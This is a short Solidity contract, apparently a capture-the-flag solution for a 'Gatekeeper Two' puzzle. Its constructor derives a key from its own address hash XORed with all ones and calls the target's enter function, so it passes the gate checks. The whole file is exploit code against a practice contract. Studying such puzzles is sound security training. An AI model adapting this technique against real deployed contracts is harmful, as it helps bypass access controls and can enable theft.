// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './GateKeeperOne.sol';

contract HackGateTwo {

  using SafeMath for uint256;
  address public gatekoadd;
  event Fail(bytes data);

  constructor(address _gatekoadd) public {
    gatekoadd = _gatekoadd;
    uint64 key64 = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1);
    (bool result, bytes memory data) = gatekoadd.call.value(0 ether)(abi.encodeWithSignature("enter(bytes8)", bytes8(key64)));
    emit Fail(data);
  }
}